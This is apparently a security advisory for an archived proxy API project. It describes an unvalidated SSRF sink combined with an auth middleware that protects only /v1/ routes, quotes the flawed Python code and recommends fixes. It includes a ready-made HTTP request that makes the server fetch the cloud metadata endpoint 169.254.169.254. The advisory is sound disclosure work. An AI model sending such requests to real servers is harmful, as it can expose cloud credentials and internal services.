# SSRF + Auth Bypass in AIstudioProxyAPI

**Date:** 2026-05-25
**Repo:** https://github.com/CJackHwang/AIstudioProxyAPI
**Status:** Archived (no patch possible)
**Method:** Static code analysis
**CWE:** CWE-918 (Server-Side Request Forgery)
**Severity:** High

## Summary

The `/api/proxy/test` endpoint accepts a user-controlled `test_url` parameter with zero validation. Combined with an authentication middleware that only protects `/v1/` routes, this endpoint is unauthenticated by default and allows an attacker to make the server fetch arbitrary internal or external URLs.

## Vulnerability 1 — Unvalidated SSRF sink (routers/proxy.py)

The `test_url` field in `ProxyTestRequest` has no validation:

```python
class ProxyTestRequest(BaseModel):
    address: str
    test_url: str = Field(default="http://httpbin.org/get")  # No allowlist, no validation
```

It is passed directly to httpx with `follow_redirects=True`:

```python
async with httpx.AsyncClient(proxy=proxy_addr, follow_redirects=True) as client:
    response = await client.get(test_url)
```

An attacker can supply any URL — internal services, cloud metadata endpoints, localhost ports — and the server will fetch it and return the response.

## Vulnerability 2 — Auth bypass (api_utils/app.py)

The `APIKeyAuthMiddleware` only enforces authentication on `/v1/` routes:

```python
class APIKeyAuthMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        if not auth_utils.API_KEYS:
            return await call_next(request)
        if not request.url.path.startswith("/v1/"):
            return await call_next(request)  # All /api/ routes bypass auth entirely
```

The proxy endpoint is registered at `/api/proxy/test` — outside `/v1/` — so it is never subject to any authentication check, regardless of whether API keys are configured.

## Compounding Factor — Default no-auth state (api_utils/auth_utils.py)

On a fresh install, `key.txt` is created empty. The verification function treats an empty key file as "no validation required":

```python
def verify_api_key(api_key_from_header: str) -> bool:
    if not API_KEYS:
        return True  # Empty key file = all requests pass
    return api_key_from_header in API_KEYS
```

This means even the `/v1/` routes are unprotected by default — but more critically, `/api/proxy/test` remains unprotected regardless of key configuration due to the middleware path check above.

## Full Attack Chain

1. Attacker sends unauthenticated POST to `/api/proxy/test`
2. Supplies attacker-controlled `test_url` pointing to an internal target
3. Server fetches the URL via httpx with `follow_redirects=True`
4. Response content is returned to the attacker

```http
POST /api/proxy/test HTTP/1.1
Host: <target>
Content-Type: application/json

{
  "address": "http://127.0.0.1:7890",
  "test_url": "http://169.254.169.254/latest/meta-data/"
}
```

Potential targets include AWS/GCP/Azure instance metadata services, internal admin panels, database ports, and other services bound to localhost or internal network interfaces.

## Files Reviewed

- `routers/proxy.py` — SSRF sink, unvalidated `test_url`
- `api_utils/app.py` — Auth middleware, `/v1/`-only protection
- `api_utils/auth_utils.py` — Default no-auth behavior
- `api_utils/dependencies.py` — Dependency injection, no auth on proxy routes

## Recommended Fix

1. Validate `test_url` against an allowlist of permitted hosts/schemes
2. Extend `APIKeyAuthMiddleware` to also protect `/api/` routes
3. Block requests to private IP ranges (127.x, 169.254.x, 10.x, 192.168.x, ::1)

## Notes

Live PoC not tested — requires Playwright + Camoufox browser automation environment. Vulnerability confirmed via static code analysis tracing the full request path from endpoint definition through middleware to httpx execution.
